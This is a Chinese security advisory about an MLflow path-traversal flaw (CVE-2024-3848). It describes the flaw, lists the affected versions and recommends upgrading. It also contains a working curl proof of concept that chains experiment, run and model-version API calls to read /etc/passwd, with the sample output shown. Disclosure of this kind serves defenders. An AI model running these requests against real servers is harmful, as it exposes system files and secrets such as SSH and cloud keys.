---
cve: "CVE-2024-3848"
source: "gelusus/wxvl 公众号漏洞文库"
---

#  【漏洞预警】mlflow信息泄露漏洞(CVE-2024-3848)   
cexlife  飓风网络安全   2024-05-17 17:02  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibhQpAia4xu02QD7v8DcIf568vLQkLNtppKbwESUckGK5opUfA4WeJ49nPTPxaj3GwAEt2V7kZ9Mvib2cEoz7wqHQ/640?wx_fmt=png&from=appmsg "")  
  
**漏洞描述:**  
  
mlflоԝ/mlflоԝ版本2.11.0中存在一个路径遍历漏洞,该漏洞被识别为先前解决的CVE-2023-6909的绕过,该漏洞源于应用程序对工件URL的处理,其中可以使用“#”字符将路径插入片段，从而有效地跳过验证,这允许攻击者构建一个URL,该URL在处理后会忽略协议方案并使用提供的路径进行文件系统访问。因此,攻击者可以通过利用应用程序将URL转换为文件系统路径的方式来读取任意文件,包括SSH和云密钥等敏感信息,该问题源于对ＵRL的片段部分验证不足,导致通过路径遍历读取任意文件。  
  
**漏洞利用思路:**  
  
$ mlflow ui  
  
$ curl -X POST -H 'Content-Type: application/json' -d '{"name": "bypass", "artifact_location": "http://host#/../../../../../../../../../../../../../../etc/"}' 'http://127.0.0.1:5000/ajax-api/2.0/mlflow/experiments/create'创建一个与以前的 experiment_id: $ curl -X POST -H 'Content-Type: application/json' -d '{"experiment_id": "{{experiment_id}}"}' 'http://127.0.0.1:5000/api/2.0/mlflow/runs/create'# Response{  "run": {    "info": {      "experiment_id": "224397038277278053",      # ...      "artifact_uri": "http://host/3ea60c6e13f544188adfcd7de0d8a79a/artifacts#/../../../../../../../../../../../../../../etc/",      # ...      "run_id": "3ea60c6e13f544188adfcd7de0d8a79a"    },   # ...  }}创建一个注册的模型:$ curl -X POST -H 'Content-Type: application/json' -d '{"name": "bypass"}' 'http://127.0.0.1:5000/ajax-api/2.0/mlflow/registered-models/create'链接模型版本之前 run_id: $ curl -X POST -H 'Content-Type: application/json' -d '{"name": "bypass", "run_id": "{{run_id}}", "source": "file:///etc/"}' 'http://127.0.0.1:5000/ajax-api/2.0/mlflow/model-versions/create'# Response{  "model_version": {    "name": "bypass",    "version": "1",   # ...    "source": "file:///etc/",    "run_id": "27b0624006b94c998434d063387a8b06",   # ...  }}读取/etc/passwd: $ curl 'http://127.0.0.1:5000/model-versions/get-artifact?path=passwd&name=bypass&version=1'root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologin  
  
  
(....)  
  
****  
**影响产品:**  
  
2.9.2<=mlflow<2.12.1 **补丁名称:**mlfｌоԝ 信息泄露漏洞—关注厂商的主页以获取最新版本**文件链接:**https://github.com/mlflow/mlflow/releases/tag/v2.12.2  
  
**修复方案：**  
  
目前官方已有可更新版本,建议受影响用户升级至最新版本   
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
